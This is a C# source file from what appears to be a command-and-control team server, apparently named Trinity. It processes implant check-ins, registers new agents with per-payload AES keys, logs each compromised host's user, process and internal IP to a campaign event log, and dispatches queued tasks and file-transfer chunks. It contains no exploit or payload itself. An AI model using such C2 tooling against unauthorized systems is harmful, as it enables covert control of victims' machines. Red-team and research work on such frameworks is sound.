//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using System.Text;
using System.Text.Json;
using TeamServer.Interface;
using TeamServer.Repositories;
using TeamServer.Services.Factories;
using TeamServer.Utils;
using Trinity.Shared.DTOs.Agent;
using Trinity.Shared.DTOs.Checkin;
using Trinity.Shared.DTOs.Notification;
using Trinity.Shared.Enums;
using Trinity.Shared.Enums.Tasks;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Results;
using static Trinity.Shared.Constants.CheckinRequestOffsets;
using static Trinity.Shared.Constants.SectionLayout;

namespace TeamServer.Services
{
    public class AgentService : IAgentService
    {
        private readonly AgentRepository _agentRepo;
        private readonly AgentFactory _agentFactory;
        private readonly TaskRepository _taskRepo;
        private readonly TaskResultRepository _taskResultRepo;
        private readonly TaskResultFactory _taskResultFactory;
        private readonly HostRepository _hostRepo;
        private readonly PayloadRepository _payloadRepo;
        private readonly INotificationHub _notificationHub;
        private readonly ICheckinResponseHandler _responseHandler;
        private readonly IHostFactory _hostFactory;
        private readonly ITaskRequestFactory _taskRequestFactory;
        private readonly ILogger<AgentService> _logger;
        private readonly IFileTransferService _fileTransferService;


        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        public AgentService(AgentRepository agentRepository, TaskRepository taskRepository,
            AgentFactory agentFactory, TaskResultRepository taskResultRepository, TaskResultFactory taskResultFactory,
            HostRepository hostRepository, PayloadRepository payloadRepository, INotificationHub notificationHub,
            ICheckinResponseHandler checkinResponseHandler, IHostFactory hostFactory,
            ITaskRequestFactory taskRequestFactory, IFileTransferService fileTransferService, ILogger<AgentService> logger)
        {
            _agentRepo = agentRepository;
            _agentFactory = agentFactory;
            _taskRepo = taskRepository;
            _taskResultFactory = taskResultFactory;
            _taskResultRepo = taskResultRepository;
            _hostRepo = hostRepository;
            _payloadRepo = payloadRepository;
            _notificationHub = notificationHub;
            _responseHandler = checkinResponseHandler;
            _hostFactory = hostFactory;
            _taskRequestFactory = taskRequestFactory;
            _fileTransferService = fileTransferService;
            _logger = logger;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Processes an agent check-in using a base64-encoded blob and returns the result.
        /// </summary>
        /// <param name="blob">A base64-encoded string containing agent check-in data.</param>
        /// <returns>A task that represents the asynchronous operation. The task result contains a Result with the formatted
        /// check-in response.</returns>
        public async Task<Result<string>> Checkin(string blob, int sleepMs = 0, int jitter = 0)
        {
            // Decode base64
            var decodedBytes = Util.Base64Decode(blob);
            // Get the UUID
            var blobSpan = new ReadOnlyMemory<byte>(decodedBytes);
            var uuid = Encoding.UTF8.GetString(blobSpan.Slice(RequestStartIndex, UUIDOffset).Span);
            var response = blobSpan.Slice(36, blobSpan.Length - UUIDOffset);

            var agent = await _agentRepo.GetAgentByCheckInUUID(uuid);
            _logger.LogDebug(
                "Checkin uuid={Uuid} payloadLen={PayloadLen} knownAgent={Known}",
                uuid,
                response.Length,
                agent != null
            );

            if (agent == null)
            {
                return await ProcessIntialCheckin(uuid, response);
            }

            // The UI derives online/offline from LastCheckIn, so every check-in has to move it.
            // It was only set when the session was created, which left live agents "offline"
            // for their whole life.
            agent.LastCheckIn = DateTime.UtcNow;

            // The interval is the agent's, not the server's: `set/sleep` changes the loop, and only
            // the agent knows what it actually adopted (including jitter). Without this the panel
            // kept saying 5000 ms for an agent on a 60 s beacon.
            if (sleepMs > 0)
            {
                agent.Sleep = sleepMs;
                agent.Jitter = jitter;
            }
            await _agentRepo.CommitAsync();

            var request = await ProcessFullyEstablishedCheckin(agent.ID, uuid, response);
            return FormatRequest(uuid, request);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Creates an Agent session and stores host metadata.
        /// </summary>
        /// <param name="uuid"></param>
        /// <param name="requestBody"></param>
        /// <returns></returns>
        private async Task<string> ProcessIntialCheckin(string uuid, ReadOnlyMemory<byte> requestBody)
        {
            var data = JsonSerializer.Deserialize<IntialCheckInRequest>(requestBody.Span) ?? new IntialCheckInRequest();
            var payload = await _payloadRepo.GetPayloadByUUIDAsync(uuid);

            var agent = _agentFactory.Create(
                data!,
                payload!.AES256KEY,
                5000,
                10,
                Util.GetEnumValue<Architectures>(payload.Architecture),
                payload.ID,
                payload.ListenerID,
                payload.CampaignID
            );
            await _agentRepo.CreateAgentAsync(agent);
            await _agentRepo.CommitAsync();

            var host = _hostFactory.CreateHost(agent.ID, ref data!);
            await _hostRepo.AddHostAsync(host);
            await _hostRepo.CommitAsync();

            // A brand-new agent is the event an operator most wants live, so it goes to the campaign's
            // event-log group as soon as the session exists (the campaign comes from the payload).
            await _notificationHub.SendEventLogAsync(
                payload.CampaignID.ToString(),
                new EventLog(DateTime.UtcNow, EventLogType.AGENT,
                    $"Agent {agent.ID} checked in as '{data!.user}' ({data.processName}) on {data.internalIP}"));

            return CreateBase64Blob(agent.CheckInUUID);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Stores task responses from the agent and retrieves queued task for dispatch.
        /// </summary>
        /// <param name="agentID"></param>
        /// <param name="requestBody"></param>
        /// <returns></returns>
        private async Task<string> ProcessFullyEstablishedCheckin(int agentID, string agentKey, ReadOnlyMemory<byte> requestBody)
        {
            using JsonDocument doc = JsonDocument.Parse(requestBody);

            // The agent posts an array of task results, or {} / [] when it has nothing to report.
            if (doc.RootElement.ValueKind == JsonValueKind.Array)
            {
                foreach (JsonElement result in doc.RootElement.EnumerateArray())
                {
                    await _responseHandler.HandleResponseAsync(result);
                    await AdvanceDownloadAsync(result, agentKey);
                }
            }

            var task = await _taskRepo.GetTaskFromQueueAsync(agentID);
            if (task?.CommandType == TaskType.DOWNLOAD && task.Code == TaskCode.DOWNLOAD)
            {
                try
                {
                    var command = await _fileTransferService.PrepareDownloadChunkAsync(task, agentKey);
                    await _taskRepo.CommitAsync();
                    return _taskRequestFactory.Create(task, command);
                }
                catch (Exception ex)
                {
                    // A missing file (or any preparation failure) must not abort the check-in:
                    // that leaves the task parked in the queue forever and the agent never learns
                    // it has work. Fall back to a plain task and let the client fetch it.
                    _logger.LogWarning(
                        ex,
                        "Could not prepare download chunk for task {TaskID}; falling back to a plain task",
                        task.ID
                    );
                    return _taskRequestFactory.Create(task);
                }
            }
            return _taskRequestFactory.Create(task);
        }

        private async Task AdvanceDownloadAsync(JsonElement response, string agentKey)
        {
            if (!response.TryGetProperty("Status", out var statusElement)
                || statusElement.GetInt32() != (int)Status.SUCCESS)
                return;

            var taskId = response.GetProperty("TaskID").GetInt32();
            var task = await _taskRepo.GetByIdAsync(taskId);
            if (task?.CommandType != TaskType.DOWNLOAD || task.Code != TaskCode.DOWNLOAD)
                return;

            // A command without "Final" was delivered as a plain task (no chunk prepared, e.g. the
            // file was missing): the agent fetched it itself, so its success result is terminal.
            if (!task.Command.RootElement.TryGetProperty("Final", out var finalElement))
                return;

            if (!finalElement.GetBoolean())
            {
                task.Status = Status.QUEUED;
                await _taskRepo.CommitAsync();
            }
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        public async Task<Result<List<AgentResponse>>> GetAgentsAsync()
        {
            return await _agentRepo.GetAgentsAsync();
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        private string CreateBase64Blob(string uuid)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(uuid);
            return System.Convert.ToBase64String(bytes);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        private string FormatRequest(string uuid, string request)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(request);
            return Convert.ToBase64String(bytes);
        }
    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//